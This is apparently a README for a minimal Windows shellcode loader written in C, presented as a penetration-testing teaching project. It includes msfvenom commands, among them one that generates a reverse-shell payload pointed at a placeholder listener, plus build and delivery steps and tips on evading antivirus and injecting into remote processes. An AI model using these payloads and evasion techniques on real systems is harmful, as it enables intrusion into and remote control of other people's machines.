
# StealthExec - Minimal Shellcode Loader in C

## FOR EDUCATIONAL PURPOSES ONLY

## Objective
StealthExec is a minimal shellcode loader written in C that injects and executes shellcode in a process's own memory space. The goal of this project is to provide a simple yet effective way to load and execute shellcode, primarily for educational and testing purposes in cybersecurity.

## Requirements

- A Linux environment (Kali Linux recommended)
- MinGW installed for cross-compiling Windows executables
- A Windows VM for testing the shellcode execution

### Get Kali:
- [Kali Linux Download](https://www.kali.org/get-kali/#kali-platforms)

### Get a Windows VM:
- [Windows VM Download](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)

### Install MinGW on Kali:
```bash
sudo apt-get install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64
```

## Shellcode Examples Included in StealthExec

### 1. MessageBox Shellcode (Windows)
This shellcode generates a message box with a customizable title and text. It was generated using **msfvenom** with the following command:
```bash
msfvenom -p windows/x64/messagebox TEXT="Shellcode Executed!" TITLE="StealthExec" -f c
```
This is useful for testing shellcode execution without performing any harmful actions. The message box will appear on the screen when the shellcode is executed.

### 2. Reverse Shell Shellcode (Windows)
This shellcode opens a reverse shell on the target machine. To generate this shellcode, use **msfvenom** with the appropriate IP and port:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f c
```
Replace `<Your_IP>` and `<Your_Port>` with your listener IP address and port. This type of shellcode is often used in penetration testing to gain control of a compromised system.

### 3. Calc.exe Shellcode (Windows)
This shellcode launches the `calc.exe` application (the Windows calculator) as a harmless example of process execution via shellcode. It demonstrates how shellcode can trigger actions on the host system. The **msfvenom** command for generating this shellcode is:
```bash
msfvenom -p windows/exec CMD=calc.exe -f c
```
This shellcode is useful for testing process injection and execution without malicious intent.

## How to Use

### Step 1: Generate Shellcode
You can generate your own shellcode using **msfvenom** or use the examples provided in the `stealthexec_with_examples.c` script.

### Step 2: Compile StealthExec
Compile the C code using the **MinGW** compiler:
```bash
x86_64-w64-mingw32-gcc stealthexec_with_examples.c -o stealthexec.exe
```
This will generate a Windows executable (`stealthexec.exe`) that can be run on a Windows system.

### Step 3: Test the Executable
To test the execution, you can transfer the compiled executable to your Windows system using a Python HTTP server:
```bash
python3 -m http.server
```
On the Windows machine, download and run the executable.

### Step 4: Debugging and Antivirus
Since StealthExec uses raw shellcode, it’s likely to be flagged by antivirus software. Ensure that antivirus software is disabled or set an exception for the testing phase.

## Advanced Techniques

### Enhancements:
1. **Obfuscation**: You can implement shellcode obfuscation to bypass antivirus detection.
2. **Dynamic Memory Management**: Instead of using `VirtualAlloc`, experiment with alternative memory allocation techniques to reduce detection.
3. **Process Injection**: Implement process injection techniques to load shellcode into remote processes for more advanced attacks.

